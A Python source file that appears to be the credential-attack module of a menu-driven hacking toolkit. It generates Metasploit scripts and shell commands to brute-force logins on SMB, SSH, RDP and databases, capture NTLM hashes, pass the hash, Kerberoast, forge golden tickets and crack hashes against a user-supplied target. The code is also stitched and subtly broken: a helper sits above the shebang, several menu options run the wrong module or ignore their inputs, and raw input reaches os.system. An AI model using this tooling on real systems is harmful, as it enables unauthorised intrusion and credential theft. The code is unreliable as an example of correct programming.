
def box(title, icon="⚔️"):
    print()
    print(f"[31m[1m  ┌{'─'*46}┐[0m")
    print(f"[31m[1m  │[0m  [32m[1m{icon}  [33m[1m{title}[0m  [31m[1m{' '*(43-len(title))}[0m")
    print(f"[31m[1m  └{'─'*46}┘[0m")
    print()

section_header = box

def move_to_sdcard(filepath):
    if not os.path.exists(filepath):
        return False
    for sd in ["/sdcard", "/storage/emulated/0"]:
        if os.path.exists(sd):
            dest = os.path.join(sd, os.path.basename(filepath))
            try:
                import shutil as _sh
                _sh.copy2(filepath, dest)
                print(f"  [32m[1m  ✅ Moved to {dest}[0m")
                return True
            except:
                pass
    print(f"  [36m[1m  ➜ {filepath}[0m")
    return False
#!/usr/bin/env python3
"""Credential Attacks Module - Brute Force, Pass-the-Hash, Hash Dump"""

import os
import sys
import shutil
import subprocess

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    subprocess.run([sys.executable, "-m", "pip", "install", "colorama", "--break-system-packages"], capture_output=True)
    from colorama import Fore, Style, init
    init(autoreset=True)

R, G, Y, B, M, C, W = Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE
D, BRIGHT, RESET = Style.DIM, Style.BRIGHT, Style.RESET_ALL


# ═══════════════════════════════════════════════════════════════
#  TOOL DETECTOR (same as main.py)
# ═══════════════════════════════════════════════════════════════

MSF_PATHS = [
    os.path.expanduser("~/metasploit-framework/msfconsole"),
    "/opt/metasploit-framework/bin/msfconsole",
    "/usr/bin/msfconsole",
    "/usr/local/bin/msfconsole",
    shutil.which("msfconsole") or "",
]

def find_tool(name):
    path = shutil.which(name)
    if path:
        return path
    common = {
        "msfconsole": MSF_PATHS,
        "msfvenom": ["~/metasploit-framework/msfvenom", "/opt/metasploit-framework/bin/msfvenom", "/usr/bin/msfvenom"],
        "nmap": ["/usr/bin/nmap"],
        "sqlmap": ["/usr/bin/sqlmap", "/usr/share/sqlmap/sqlmap.py"],
        "hydra": ["/usr/bin/hydra"],
        "john": ["/usr/bin/john"],
        "nikto": ["/usr/bin/nikto"],
        "gobuster": ["/usr/bin/gobuster"],
        "dirb": ["/usr/bin/dirb"],
    }
    for p in common.get(name, []):
        if p and os.path.exists(p):
            return p
    return None

def get_msf_path():
    return find_tool("msfconsole") or "msfconsole"

def get_msfvenom_path():
    return find_tool("msfvenom") or "msfvenom"

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def info(msg):
    print(f"  {C}{BRIGHT}  ℹ️  ➤ {msg}{RESET}")

def success(msg):
    print(f"  {G}{BRIGHT}  ✅ ✔ {msg}{RESET}")

def error(msg):
    print(f"  {R}{BRIGHT}  ❌ ✘ {msg}{RESET}")

def cmd_result(label, value):
    print(f"  {M}{BRIGHT}  ◆ {B}{label}:{RESET} {G}{BRIGHT}{value}{RESET}")

def get_ip(prompt, default=""):
    val = input(f"  {C}{BRIGHT}{prompt}{RESET}").strip()
    return val if val else default

def box_alias(title, icon="🔐"):
    print()
    print(f"{R}{BRIGHT}  ╔════════════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{R}{BRIGHT}  ║{RESET}  {G}{BRIGHT}  {icon}  {Y}{BRIGHT}{title}{RESET}  {R}{BRIGHT}{' '*(63-len(title))}║{RESET}")
    print(f"{R}{BRIGHT}  ╚════════════════════════════════════════════════════════════════════════╝{RESET}")
    print()

def generate_rc_and_run(commands, name="cred"):
    rc_file = f"/tmp/{name}.rc"
    with open(rc_file, 'w') as f:
        for cmd in commands:
            f.write(cmd + "\n")
    info(f"Generated: {rc_file}")
    os.system(f"{get_msf_path()} -r {rc_file}")

def cred_attacks_menu():
    section_header("CREDENTIAL ATTACKS (BRUTE FORCE)", "🔐")
    
    print(f"""
  {Y}═══ LOGIN BRUTE FORCE ═══{RESET}
  {M}[1]{RESET}   {G}SMB Login Brute Force{RESET}
  {M}[2]{RESET}   {G}SSH Login Brute Force{RESET}
  {M}[3]{RESET}   {G}FTP Login Brute Force{RESET}
  {M}[4]{RESET}   {G}HTTP Login Brute Force{RESET}
  {M}[5]{RESET}   {G}HTTP NTLM Login{RESET}
  {M}[6]{RESET}   {G}MySQL Login{RESET}
  {M}[7]{RESET}   {G}PostgreSQL Login{RESET}
  {M}[8]{RESET}   {G}MSSQL Login{RESET}
  {M}[9]{RESET}   {G}Oracle Login{RESET}
  {M}[10]{RESET}  {G}Telnet Login{RESET}
  {M}[11]{RESET}  {G}VNC Login{RESET}
  {M}[12]{RESET}  {G}RDP Login{RESET}
  {M}[13]{RESET}  {G}SSH Key Login{RESET}
  {M}[14]{RESET}  {G}SNMP Community Brute{RESET}
  {M}[15]{RESET}  {G}LDAP Login{RESET}
  ─────────────────────────────────
  {Y}═══ CREDENTIAL HARVESTING ═══{RESET}
  {M}[16]{RESET}  {G}SMB Hash Capture{RESET}
  {M}[17]{RESET}  {G}HTTP NTLM Hash Capture{RESET}
  {M}[18]{RESET}  {G}FTP Hash Capture{RESET}
  {M}[19]{RESET}  {G}SMB Relay Attack{RESET}
  {M}[20]{RESET}  {G}Mimikatz (from MSF){RESET}
  ─────────────────────────────────
  {Y}═══ PASS-THE-HASH ═══{RESET}
  {M}[21]{RESET}  {G}SMB Pass-the-Hash{RESET}
  {M}[22]{RESET}  {G}WinRM Pass-the-Hash{RESET}
  {M}[23]{RESET}  {G}SSH Pass-the-Hash{RESET}
  {M}[24]{RESET}  {G}MSSQL Pass-the-Hash{RESET}
  ─────────────────────────────────
  {Y}═══ HASH TOOLS ═══{RESET}
  {M}[25]{RESET}  {G}John the Ripper (crack hashes){RESET}
  {M}[26]{RESET}  {G}Hashcat (GPU cracking){RESET}
  {M}[27]{RESET}  {G}NTLM Hash Generator{RESET}
  {M}[28]{RESET}  {G}Password Generator{RESET}
  {M}[29]{RESET}  {G}Wordlist Generator (crunch){RESET}
  {M}[30]{RESET}  {G}CeWL (Custom Wordlist){RESET}
  ─────────────────────────────────
  {Y}═══ SERVICE-SPECIFIC ═══{RESET}
  {M}[31]{RESET}  {G}SMB Enumeration{RESET}
  {M}[32]{RESET}  {G}SSH Enumeration{RESET}
  {M}[33]{RESET}  {G}DNS Zone Transfer{RESET}
  {M}[34]{RESET}  {G}LDAP User Enumeration{RESET}
  {M}[35]{RESET}  {G}NetBIOS Enumeration{RESET}
  {M}[36]{RESET}  {G}SNMP Enumeration{RESET}
  {M}[37]{RESET}  {G}RPC Enumeration{RESET}
  {M}[38]{RESET}  {G}Kerberoasting{RESET}
  {M}[39]{RESET}  {G}AS-REP Roasting{RESET}
  {M}[40]{RESET}  {G}Golden Ticket{RESET}
  ─────────────────────────────────
  {M}[41]{RESET}  {G}Custom Brute Force{RESET}
  {M}[0]{RESET}   {R}🔙 Back{RESET}
""")
    
    choice = input(f"  {C}{BRIGHT}Choose [0-41]: {RESET}").strip()
    if choice == "0":
        return
    
    target = get_ip("RHOSTS (target IP): ")
    lhost = get_ip("LHOST (your IP): ", "0.0.0.0")
    lport = get_ip("LPORT (your port): ", "4444")
    username = get_ip("Username (or blank): ", "admin")
    passlist = get_ip("Password list: ", "/usr/share/wordlists/rockyou.txt")
    
    brute_map = {
        "1": f"use auxiliary/scanner/smb/smb_login\nset RHOSTS {target}\nset USERNAME {username}\nset PASS_FILE {passlist}\nrun",
        "2": f"use auxiliary/scanner/ssh/ssh_login\nset RHOSTS {target}\nset USERNAME {username}\nset PASS_FILE {passlist}\nrun",
        "3": f"use auxiliary/scanner/ftp/ftp_login\nset RHOSTS {target}\nset USERNAME {username}\nset PASS_FILE {passlist}\nrun",
        "4": f"use auxiliary/scanner/http/http_login\nset RHOSTS {target}\nset USERNAME {username}\nset PASS_FILE {passlist}\nrun",
        "5": f"use auxiliary/scanner/http/http_ntlm_login\nset RHOSTS {target}\nset USERNAME {username}\nset PASS_FILE {passlist}\nrun",
        "6": f"use auxiliary/scanner/mysql/mysql_login\nset RHOSTS {target}\nset USERNAME {username}\nset PASS_FILE {passlist}\nrun",
        "7": f"use auxiliary/scanner/postgres/postgres_login\nset RHOSTS {target}\nset USERNAME {username}\nset PASS_FILE {passlist}\nrun",
        "8": f"use auxiliary/scanner/mssql/mssql_login\nset RHOSTS {target}\nset USERNAME {username}\nset PASS_FILE {passlist}\nrun",
        "9": f"use auxiliary/scanner/oracle/sid_enum\nset RHOSTS {target}\nrun",
        "10": f"use auxiliary/scanner/telnet/telnet_login\nset RHOSTS {target}\nset USERNAME {username}\nset PASS_FILE {passlist}\nrun",
        "11": f"use auxiliary/scanner/vnc/vnc_login\nset RHOSTS {target}\nset PASS_FILE {passlist}\nrun",
        "12": f"use auxiliary/scanner/rdp/rdp_login\nset RHOSTS {target}\nset USERNAME {username}\nset PASS_FILE {passlist}\nrun",
        "14": f"use auxiliary/scanner/snmp/snmp_login\nset RHOSTS {target}\nrun",
        "15": f"use auxiliary/scanner/ldap/ldap_login\nset RHOSTS {target}\nset USERNAME {username}\nset PASS_FILE {passlist}\nrun",
        "16": f"use auxiliary/server/capture/smb\nset SRVHOST {lhost}\nrun",
        "17": f"use auxiliary/server/capture/http_ntlm\nset SRVHOST {lhost}\nrun",
        "18": f"use auxiliary/server/capture/ftp\nset SRVHOST {lhost}\nrun",
        "21": f"use auxiliary/scanner/smb/smb_login\nset SMBPass {username}\nset RHOSTS {target}\nrun",
        "31": f"use auxiliary/scanner/smb/smb_enumshares\nset RHOSTS {target}\nrun",
        "32": f"use auxiliary/scanner/ssh/ssh_version\nset RHOSTS {target}\nrun",
        "33": f"use auxiliary/scanner/dns/dns_enum\nset RHOSTS {target}\nrun",
        "34": f"use auxiliary/scanner/ldap/ldap_enum\nset RHOSTS {target}\nrun",
        "35": f"use auxiliary/scanner/netbios/netbios_smb\nset RHOSTS {target}\nrun",
        "36": f"use auxiliary/scanner/snmp/snmp_enum\nset RHOSTS {target}\nrun",
        "37": f"use auxiliary/scanner/dcerpc/enumerated_named_pipes\nset RHOSTS {target}\nrun",
        "38": f"msfconsole -x 'use auxiliary/admin/kerberos/kerberos_login; set RHOSTS {target}; run'",
        "39": f"msfconsole -x 'use auxiliary/admin/kerberos/kerberos_login; set RHOSTS {target}; run'",
    }
    
    if choice in brute_map:
        cmds = brute_map[choice].split("\n")
        generate_rc_and_run(cmds, f"cred_{choice}")
    elif choice == "19":
        info("SMB Relay requires Responder + ntlmrelayx")
        print(f"  {Y}1. responder -I eth0{RESET}")
        print(f"  {Y}2. ntlmrelayx.py -tf targets.txt -smb2support{RESET}")
    elif choice == "20":
        info("Running Mimikatz from Meterpreter session:")
        cmds = ["use exploit/multi/handler", f"set LHOST {lhost}", "set LPORT 4444", "run"]
        generate_rc_and_run(cmds, "mimikatz_handler")
    elif choice == "25":
        hash_file = get_ip("Hash file path: ", "/root/hashes.txt")
        os.system(f"john {hash_file} --wordlist={passlist}")
    elif choice == "26":
        hash_file = get_ip("Hash file path: ", "/root/hashes.txt")
        hash_type = get_ip("Hash type (e.g., 1000 for NTLM): ", "1000")
        os.system(f"hashcat -m {hash_type} {hash_file} {passlist}")
    elif choice == "27":
        password = get_ip("Password to hash: ", "")
        if password:
            import hashlib
            nt = hashlib.new('md4', password.encode('utf-16le')).hexdigest()
            cmd_result("NTLM Hash", f"aad3b435b51404eeaad3b435b51404ee:{nt}")
    elif choice == "28":
        length = get_ip("Password length: ", "8")
        os.system(f"crunch {length} {length} -t ,@@@,,,, -o /root/generated_passwords.txt")
        success("Passwords generated: /root/generated_passwords.txt")
    elif choice == "29":
        charset = get_ip("Charset (lowercase/uppercase/digits): ", "abcdefghijklmnopqrstuvwxyz")
        min_len = get_ip("Min length: ", "6")
        max_len = get_ip("Max length: ", "8")
        os.system(f"crunch {min_len} {max_len} {charset} -o /root/crunch_wordlist.txt")
    elif choice == "30":
        url = get_ip("Target URL: ", "")
        os.system(f"cewl -w /root/cewl_wordlist.txt -d 2 -m 5 {url}")
    elif choice == "38":
        info("Kerberoasting:")
        cmds = [f"use auxiliary/admin/kerberos/kerberoast", f"set RHOSTS {target}", "run"]
        generate_rc_and_run(cmds, "kerberoast")
    elif choice == "39":
        info("AS-REP Roasting:")
        cmds = [f"use auxiliary/admin/kerberos/kerberos_asrep", f"set RHOSTS {target}", "run"]
        generate_rc_and_run(cmds, "asrep")
    elif choice == "40":
        info("Golden Ticket requires krbtgt hash:")
        krbtgt = get_ip("krbtgt NTLM hash: ", "")
        domain = get_ip("Domain name: ", "")
        cmds = [f"use exploit/windows/kerberos/golden_ticket", f"set KRB5CCNAME /tmp/ticket.cc", "run"]
        generate_rc_and_run(cmds, "golden_ticket")
    elif choice == "41":
        service = get_ip("Service (ssh/ftp/http/smb): ", "ssh")
        cmds = [f"use auxiliary/scanner/{service}/{service}_login", f"set RHOSTS {target}", f"set USERNAME {username}", f"set PASS_FILE {passlist}", "run"]
        generate_rc_and_run(cmds, "custom_brute")
